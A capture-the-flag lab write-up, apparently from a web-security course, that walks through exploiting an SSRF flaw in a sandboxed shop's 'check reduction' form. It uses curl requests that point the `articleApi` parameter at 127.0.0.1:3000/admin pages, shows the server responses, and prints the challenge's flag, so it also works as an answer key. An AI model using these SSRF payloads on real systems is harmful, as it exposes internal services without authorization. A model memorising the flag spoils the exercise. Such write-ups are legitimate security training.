# Task 0. Unlocking security, one exploit at a time!


## **Task Description**


### Securing Your Shop's Admin Dashboard: Charting a Course through Vulnerability Waters ⚓️!

**Shielding Shop Security..**

Welcome to the gateway of Server-Side Request Forgery **SSRF**, where you'll embark on a journey through the digital landscape of vulnerabilities, set against the backdrop of our meticulously designed shop website. Your mission commences with probing the foundational element of **SSRF** vulnerabilities: uncovering potential gateways to unauthorized requests.

Before diving into the main challenge, let's get you familiar with **SSRF** vulnerabilities. **SSRF** occurs when an attacker can make the server perform requests to arbitrary destinations on their behalf, often exploiting how URLs and parameters are handled. By learning about SSRF, we can start to uncover hidden security risks in systems. Let's dive into the world of **SSRF** vulnerabilities and become experts at navigating the digital world.

Your mission is to test and secure our internal admin dashboard by identifying and exploiting potential **SSRF** vulnerabilities.

- Target Application: [ShopAdmin](https://intranet-dlh.hbtn.io/rltoken/YVBEY88-G9aJrBr9Y47kIw)
- Initial Endpoint: `http://web0x08.hbtn/`

---

Useful instructions:

1. Log into ShopAdmin, it is a shopping website, there is a lot of article.
2. The challenge is about the SSRF vulnerability in check reduction functionality.
3. You can click on one article and we see that we can do a check reduction.
4. Param articleApi is vulnerable.
5. This App is Forwarded on Port 3000

**Hints**: Harness the power of **Burp Suite** to uncover SSRF vulnerabilities.



**Repo:**

- GitHub repository: `dlh-cyber_security`
- Directory: `web_application_security/0x08_ssrf`
- File: `0-flag.txt`





## **Solution**



- Start sandbox `cyber_websec_0x08`.
- Start openvpn.
- Put IP address of the sandbox in `/etc/hosts` file.
```bash
echo "10.42.254.214 web0x08.hbtn" | sudo tee -a /etc/hosts
```



## Step 1: Access ShopAdmin

Action: navigate to:

```
http://web0x08.hbtn/
```

Why?

Before testing SSRF, we need to establish how the application behaves. In particular, we want to confirm that the shop loads and determine whether authentication is required.

We already know that `articleApi` is the vulnerable parameter, so we won't waste time scanning unrelated endpoints.




<img src="./web0x08.hbtn.png" alt="Exclusive Shop" width="800"/>


## Step 2: Open a product page

Your screenshot confirms that `http://web0x08.hbtn/` is accessible and displays the Exclusive Shop storefront without requiring login.

Our next objective is to locate the Check Reduction functionality, which the challenge identifies as the SSRF entry point.

### Action

Click the first product, "Amet tempore unde" ($165), to open its details page.


<img src="./web0x08.hbtn_product.png" alt="Exclusive Shop Product" width="800"/>

The screenshot confirms that we've found the CHECK REDUCTION button, which is the functionality associated with the SSRF vulnerability.


## Step 3: Capture the Check Reduction request

Action: In Firefox, with Developer Tools already open:

1. Select the Network tab.
2. Keep the XHR filter selected.
3. Click the CHECK REDUCTION button on the product page.
4. Look for a new HTTP request in the Network panel.


<img src="./web0x08.hbtn_check-reduction.png" alt="Exclusive Shop Check Reduction" width="800"/>

## Step 4: Inspect the correct POST request

The screenshot reveals an important detail: the `CHECK REDUCTION` button submitted a request to:

```
POST http://web0x08.hbtn/check-reduction
```

The response was:

```
No Reduction code found
```


### Action

In Firefox Developer Tools:

1. Go to the Network tab.
2. Change the filter from **XHR** to **All**.
3. Look for the request named `check-reduction` with method `POST`.
4. Select it and open the **Request** tab.

If the request is missing, enable Persist Logs, return to the product page, and click `CHECK REDUCTION` again.

### Why?

The reduction button appears to submit a traditional HTML form, causing a full-page navigation rather than an XHR request. That's why the XHR filter hides it.

We need to examine the POST body, which should reveal how `articleApi` is submitted.


<img src="./web0x08.hbtn_check-reduction_filterAll.png" alt="Exclusive Shop Check Reduction Filter All" width="800"/>

The request as curl command:

```bash
curl 'http://web0x08.hbtn/check-reduction' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://web0x08.hbtn' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://web0x08.hbtn/product' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' \
  --data-raw 'articleApi=http%3A%2F%2Finternal-api.shop.com%3A3000%2Fcheck-reduction'
```

## Step 5: Test SSRF against localhost

We've identified the vulnerable parameter and its default value:

```
articleApi=http://internal-api.shop.com:3000/check-reduction
```

This is significant because the application accepts a URL supplied by the client and potentially fetches it from the server itself.

Our first test will determine whether we can redirect that server-side request to the loopback interface.

### Action: Execute this command in the Kali terminal

```bash
curl -i -sS -X POST 'http://web0x08.hbtn/check-reduction' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://127.0.0.1:3000/'
```

### Why this command?

- `POST /check-reduction`: Uses the legitimate application endpoint.
- `articleApi`: The parameter identified as vulnerable.
- `127.0.0.1`: Refers to the server's own loopback interface when interpreted by the backend.
- `:3000`: The application port specified in the challenge.
- `--data-urlencode`: Automatically URL-encodes the form parameter.
- `-i`: Includes HTTP response headers so we can inspect the status code.

What we're testing: Whether the backend will accept an alternative URL instead of the original `internal-api.shop.com` destination.

If successful, this establishes a path for reaching internal resources that aren't directly exposed to the browser.


```bash
curl -i -sS -X POST 'http://web0x08.hbtn/check-reduction' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://127.0.0.1:3000/'
# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Mon, 09 Nov 2026 18:00:35 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 132071
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"203e7-k/RqKcdnioY4AVMOXQIYjutGs0s"
#
# <!DOCTYPE html>
# <html lang="en">
#   <head>
#     <meta charset="UTF-8" />
#     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
#     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
#     <meta name="format-detection" content="telephone=no" />
#     <title>Exclusive Shop</title>

# . . .

#         </div>
#         <!-- Quick View Product - end -->
#       </section>
#     </main>
#     <!-- Main Content - end -->
#
#     <!-- jQuery plugins/scripts - start -->
#     <script src="js/jquery-1.11.2.min.js"></script>
#     <script src="js/jquery.bxslider.min.js"></script>
#     <script src="js/fancybox/fancybox.js"></script>
#     <script src="js/fancybox/helpers/jquery.fancybox-thumbs.js"></script>
#     <script src="js/jquery.flexslider-min.js"></script>
#     <script src="js/swiper.jquery.min.js"></script>
#     <script src="js/jquery.waypoints.min.js"></script>
#     <script src="js/progressbar.min.js"></script>
#     <script src="js/ion.rangeSlider.min.js"></script>
#     <script src="js/chosen.jquery.min.js"></script>
#     <script src="js/jQuery.Brazzers-Carousel.js"></script>
#     <script src="js/plugins.js"></script>
#     <script src="js/main.js"></script>
#     <script src="https://maps.googleapis.com/maps/api/js?# key=AIzaSyDhAYvx0GmLyN5hlf6Uv_e9pPvUT3YpozE"></script>
#     <script src="js/gmap.js"></script>
#     <!-- jQuery plugins/scripts - end -->
#   </body>
# </html>
```

## Step 6: Probe the internal admin dashboard

The result is strong evidence that SSRF is working!

The server accepted:

```
articleApi=http://127.0.0.1:3000/
```

And returned the complete Exclusive Shop HTML page (132,071 bytes) instead of the original reduction-check response.

This indicates that the backend is fetching the supplied URL and returning its contents.

### Action: Test the `/admin` endpoint

Execute this command in Kali:

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/check-reduction' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://127.0.0.1:3000/admin' \
  | head -c 4000
```

### Why?

We are changing the SSRF destination from:

`http://127.0.0.1:3000/`

to:

`http://127.0.0.1:3000/admin`

The `/admin` path is a common location for administrative interfaces.

If the server returns an admin page, we've potentially bypassed the external access restrictions by making the backend request its own internal resource.

The `head -c 4000` portion limits the displayed response to the first 4,000 bytes.

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/check-reduction' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://127.0.0.1:3000/admin'
# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Mon, 09 Nov 2026 18:11:12 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 3292
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"cdc-FL9Hp623/7dM1l1quLUJXI3nVkQ"
#
# <!DOCTYPE html>
# <html lang="en">
#   <head>
#     <meta charset="UTF-8" />
#     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
#     <title>Admin Dashboard</title>
#     <link
#       rel="stylesheet"
#       href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/# bootstrap.min.css"
#     />
#     <link rel="stylesheet" href="/css/adminstyle.css" />
#   </head>
#   <body>
#     <header>
#       <h1>Admin Dashboard</h1>
#       <nav>
#         <ul>
#           <li><a href="/admin/dashboard">Dashboard</a></li>
#           <li><a href="/admin/list-of-items">Items</a></li>
#         </ul>
#       </nav>
#     </header>
#
# . . .
#
#     <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
#     <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/# popper.min.js"></script>
#     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/# bootstrap.min.js"></script>
#   </body>
# </html>
```

## Step 7: Explore the internal admin dashboard

We've confirmed that the SSRF vulnerability allows us to retrieve the internal Admin Dashboard through `127.0.0.1:3000`.

The response reveals two interesting endpoints:

```
/admin/dashboard
/admin/list-of-items
```

Both are linked directly from the admin interface.

### Action: Access `/admin/dashboard` via SSRF

Execute this command in the Kali terminal:

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/check-reduction' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://127.0.0.1:3000/admin/dashboard'
```

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/check-reduction' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://127.0.0.1:3000/admin/dashboard'
# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Mon, 09 Nov 2026 18:43:46 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 25
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"19-rj/wYvt6UEdbVK+Zoa6J5tKHlZk"
#
# Error fetching stock data
```
☹️


### Action: Access `/admin/list-of-items` via SSRF

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/check-reduction' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://127.0.0.1:3000/admin/list-of-items'
# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Mon, 09 Nov 2026 18:44:22 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 1418
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"58a-wmJ9v1x0aml8v1oX1czSM87pEOg"
#
# <!DOCTYPE html>
# <html lang="en">
#   <head>
#     <meta charset="UTF-8" />
#     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
#     <title>Admin Items</title>
#     <link
#       rel="stylesheet"
#       href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
#     />
#     <link rel="stylesheet" href="/css/adminstyle.css" />
#   </head>
#   <body>
#     <header>
#       <h1>Admin Items</h1>
#       <nav>
#         <ul>
#           <li><a href="/admin/dashboard">Dashboard</a></li>
#           <li><a href="/admin/list-of-items">Items</a></li>
#         </ul>
#       </nav>
#     </header>
#     <div class="container mt-5">
#       <table class="table table-striped">
#         <thead>
#           <tr>
#             <th>ID</th>
#             <th>Name</th>
#             <th>Description</th>
#             <th>Price</th>
#           </tr>
#         </thead>
#         <tbody>
#           <tr>
#             <td>1</td>
#             <td>FLAG_0</td>
#             <td>1871c80b1bc83b3b6f45582d53e5a840</td>
#             <td>500</td>
#           </tr>
#         </tbody>
#       </table>
#     </div>
#     <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
#     <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
#     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
#   </body>
# </html>
```
😀

## Step 8: Save the flag

We've found FLAG_0!

The `/admin/dashboard` endpoint returned an error, but `/admin/list-of-items` successfully exposed the flag.

The SSRF request to `/admin/list-of-items` exposed an internal table containing:

| Field | Value                              |
| ----- | ---------------------------------- |
| ID    | 1                                  |
| Name  | `FLAG_0`                           |
| Flag  | `1871c80b1bc83b3b6f45582d53e5a840` |



### Action: Save the flag to the required file


```bash
echo -n '1871c80b1bc83b3b6f45582d53e5a840' > 0-flag.txt
git add .
git commit -m "0-flag.txt"
git push
```
